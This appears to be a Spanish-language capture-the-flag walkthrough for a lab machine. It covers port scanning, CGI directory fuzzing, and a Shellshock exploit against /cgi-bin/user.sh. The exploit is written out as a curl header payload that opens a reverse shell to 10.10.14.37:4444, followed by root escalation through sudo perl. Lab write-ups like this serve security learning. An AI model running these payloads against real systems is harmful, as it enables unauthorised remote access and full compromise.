  
We start with a scan of ports and services using the nmap tool.
```JavaScript
sudo nmap -p- --open -sS --min-rate 5000 -n -v -sV -Pn 10.10.10.56 > escaneo.txt
```
![[/Untitled 37.png|Untitled 37.png]]
Encontramos que los puertos 80 (http) y 2222(ssh) estan abiertos,
ademas el puerto 80 corre un servicio apache.
Usaremos la herramienta whatweb para escanear la web antes de visitarla
![[/Untitled 1 3.png|Untitled 1 3.png]]
![[/Untitled 2 4.png|Untitled 2 4.png]]
Visitamos la web
  
  
Al ver que no encontramos nada en la web ni en los metadatos de la imagen hacemos un fuzzing de directorios y extensiones
Sin la / despues del FUZZ
```JavaScript
ffuf -w ../../../diccionario/Directorios/directory-list-2.3-medium.txt -u http://10.10.10.56/FUZZ -e .txt,.html,.php -c
```
![[/Untitled 3 4.png|Untitled 3 4.png]]
Hemos lanzado el escaneo sin la / al final y no encuentra nada por lo que la añadiremos a ver que pasa (algunos directorios no los encuentra con la barra al final vicebersa)
```JavaScript
ffuf -w ../../../diccionario/Directorios/directory-list-2.3-medium.txt -u http://10.10.10.56/FUZZ/ -e .txt,.html,.php -c
```
![[/Untitled 4 3.png|Untitled 4 3.png]]
Hemos encontrado estos directorios
cgi-bin es un directorio que permite la ejecucion de scripts basados en Perl y Shell.  
Buscamos vulneravilidades  
  
[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
  
Encontramos en la web el siguente escaneo para ver si es vulbnerable o no
```JavaScript
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
En la uri vemos que se indica un archivo, asumimos que no es el mismo y hacemos un fuzzing para ver cual es el nuestro.  
Teniendo en cuenta los scripts que se ejecutan en este directorio haremos un escaneo con unas externsiones concretas  
.pl,.pm,.t,.sh,.bash,.zsh,.ksh
```JavaScript
ffuf -w Desktop/diccionario/Directorios/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin/FUZZ -e pl,.pm,.t,.sh,.bash,.zsh,.ksh -c
```
este es nuestro archivo
![[/Untitled 5 3.png|Untitled 5 3.png]]
Procedemos a comprobar si es vulnerable o no la web en cuestión
```JavaScript
nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh
```
![[/Untitled 6 3.png|Untitled 6 3.png]]
Ejecutamos
```JavaScript
curl -H 'User-Agent: () { :; }; "' http://10.10.10.56/cgi-bin/user.sh 2>/dev/null
```
Devuelve  
  
![[/Untitled 7 3.png|Untitled 7 3.png]]
Al introducir 10.10.10.56/cgi-bin/user.sh en el navegador se nos descarga el archivo y comprobamos que el contenido es el mismo, por lo que es vulnerable.
Esta es la reverse shell
```JavaScript
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.37/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh
```
Nos ponemos en escucha y la ejecutamos
  
![[/Untitled 8 3.png|Untitled 8 3.png]]
Hacemos un sudo -l y vemos si podemos ejecutar algun binario como sudo
![[/Untitled 9 3.png|Untitled 9 3.png]]
Vemos que podemos ejecutar el binario perl como sudo por lo que nos dirigimos a GTFOBins
![[/Untitled 10 3.png|Untitled 10 3.png]]
![[/Untitled 11 3.png|Untitled 11 3.png]]
Ejecutamos el comando
```JavaScript
sudo perl -e 'exec "/bin/sh";'
```
![[/Untitled 12 2.png|Untitled 12 2.png]]
Ya somos Root!!!!!!!!!!  
  
User flag  
![[/Untitled 13 2.png|Untitled 13 2.png]]
Root flag
![[/Untitled 14 2.png|Untitled 14 2.png]]